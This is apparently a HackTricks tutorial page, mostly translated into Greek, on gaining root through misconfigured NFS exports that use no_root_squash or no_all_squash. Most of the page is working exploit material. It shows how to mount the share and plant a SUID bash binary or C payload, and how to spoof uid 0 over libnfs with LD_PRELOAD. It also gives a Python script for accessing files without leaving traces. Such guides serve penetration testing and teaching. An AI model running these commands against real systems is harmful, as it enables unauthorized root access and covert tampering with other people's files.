{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}


Διαβάστε το _ **/etc/exports** _ αρχείο, αν βρείτε κάποιον κατάλογο που είναι ρυθμισμένος ως **no\_root\_squash**, τότε μπορείτε να **έχετε πρόσβαση** σε αυτόν **ως πελάτης** και να **γράφετε μέσα** σε αυτόν τον κατάλογο **σαν** να ήσασταν ο τοπικός **root** της μηχανής.

**no\_root\_squash**: Αυτή η επιλογή δίνει βασικά εξουσία στον χρήστη root στον πελάτη να έχει πρόσβαση σε αρχεία στον NFS server ως root. Και αυτό μπορεί να οδηγήσει σε σοβαρές επιπτώσεις ασφαλείας.

**no\_all\_squash:** Αυτή είναι παρόμοια με την επιλογή **no\_root\_squash** αλλά εφαρμόζεται σε **μη-root χρήστες**. Φανταστείτε, έχετε ένα shell ως χρήστης nobody; ελέγξατε το αρχείο /etc/exports; η επιλογή no\_all\_squash είναι παρούσα; ελέγξτε το αρχείο /etc/passwd; μιμηθείτε έναν μη-root χρήστη; δημιουργήστε ένα αρχείο suid ως αυτός ο χρήστης (με την τοποθέτηση χρησιμοποιώντας nfs). Εκτελέστε το suid ως χρήστης nobody και γίνετε διαφορετικός χρήστης.

# Privilege Escalation

## Remote Exploit

Αν έχετε βρει αυτή την ευπάθεια, μπορείτε να την εκμεταλλευτείτε:

* **Τοποθετώντας αυτόν τον κατάλογο** σε μια μηχανή πελάτη, και **ως root αντιγράφοντας** μέσα στον τοποθετημένο φάκελο το **/bin/bash** δυαδικό και δίνοντάς του **SUID** δικαιώματα, και **εκτελώντας από τη μηχανή του θύματος** αυτό το δυαδικό bash.
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
* **Τοποθετώντας αυτόν τον φάκελο** σε μια μηχανή-πελάτη, και **ως root αντιγράφοντας** μέσα στον τοποθετημένο φάκελο το προετοιμασμένο payload μας που θα εκμεταλλευτεί την άδεια SUID, δίνοντάς του **δικαιώματα SUID**, και **εκτελώντας από τη μηχανή του θύματος** αυτό το δυαδικό (μπορείτε να βρείτε εδώ μερικά [C SUID payloads](payloads-to-execute.md#c)).
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
## Local Exploit

{% hint style="info" %}
Σημειώστε ότι αν μπορείτε να δημιουργήσετε ένα **τούνελ από τη μηχανή σας στη μηχανή του θύματος, μπορείτε ακόμα να χρησιμοποιήσετε την απομακρυσμένη έκδοση για να εκμεταλλευτείτε αυτή την κλιμάκωση προνομίων, τοποθετώντας τα απαιτούμενα ports**.\
Το παρακάτω κόλπο ισχύει στην περίπτωση που το αρχείο `/etc/exports` **υποδεικνύει μια διεύθυνση IP**. Σε αυτή την περίπτωση **δεν θα μπορείτε να χρησιμοποιήσετε** σε καμία περίπτωση την **απομακρυσμένη εκμετάλλευση** και θα χρειαστεί να **καταχραστείτε αυτό το κόλπο**.\
Ένα άλλο απαιτούμενο προαπαιτούμενο για να λειτουργήσει η εκμετάλλευση είναι ότι **η εξαγωγή μέσα στο `/etc/export`** **πρέπει να χρησιμοποιεί την ένδειξη `insecure`**.\
\--_Δεν είμαι σίγουρος αν το `/etc/export` υποδεικνύει μια διεύθυνση IP, αν αυτό το κόλπο θα λειτουργήσει_--
{% endhint %}

## Basic Information

Το σενάριο περιλαμβάνει την εκμετάλλευση ενός προσαρτημένου NFS share σε μια τοπική μηχανή, εκμεταλλευόμενο ένα σφάλμα στην προδιαγραφή NFSv3 που επιτρέπει στον πελάτη να καθορίσει το uid/gid του, ενδεχομένως επιτρέποντας μη εξουσιοδοτημένη πρόσβαση. Η εκμετάλλευση περιλαμβάνει τη χρήση του [libnfs](https://github.com/sahlberg/libnfs), μιας βιβλιοθήκης που επιτρέπει την πλαστογράφηση κλήσεων RPC NFS.

### Compiling the Library

Τα βήματα για τη συμπίεση της βιβλιοθήκης μπορεί να απαιτούν προσαρμογές με βάση την έκδοση του πυρήνα. Σε αυτή την συγκεκριμένη περίπτωση, οι κλήσεις syscalls fallocate είχαν σχολιαστεί. Η διαδικασία συμπίεσης περιλαμβάνει τις παρακάτω εντολές:
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
### Διεξαγωγή της Εκμετάλλευσης

Η εκμετάλλευση περιλαμβάνει τη δημιουργία ενός απλού προγράμματος C (`pwn.c`) που ανυψώνει τα δικαιώματα σε root και στη συνέχεια εκτελεί ένα shell. Το πρόγραμμα μεταγλωττίζεται και το προκύπτον δυαδικό αρχείο (`a.out`) τοποθετείται στο κοινόχρηστο με suid root, χρησιμοποιώντας το `ld_nfs.so` για να προσποιηθεί το uid στις κλήσεις RPC:

1. **Μεταγλωττίστε τον κώδικα εκμετάλλευσης:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **Τοποθετήστε την εκμετάλλευση στο κοινόχρηστο και τροποποιήστε τα δικαιώματά της προσποιούμενοι το uid:**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **Εκτελέστε την εκμετάλλευση για να αποκτήσετε δικαιώματα root:**
```bash
/mnt/share/a.out
#root
```

## Μπόνους: NFShell για Διακριτική Πρόσβαση σε Αρχεία
Μόλις αποκτηθεί η πρόσβαση root, για να αλληλεπιδράσετε με το NFS κοινόχρηστο χωρίς να αλλάξετε την ιδιοκτησία (για να αποφύγετε την αφή ίχνους), χρησιμοποιείται ένα σενάριο Python (nfsh.py). Αυτό το σενάριο προσαρμόζει το uid ώστε να ταιριάζει με αυτό του αρχείου που προσπελάζεται, επιτρέποντας την αλληλεπίδραση με αρχεία στο κοινόχρηστο χωρίς προβλήματα δικαιωμάτων:
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Τρέξτε όπως:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστήριξη HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
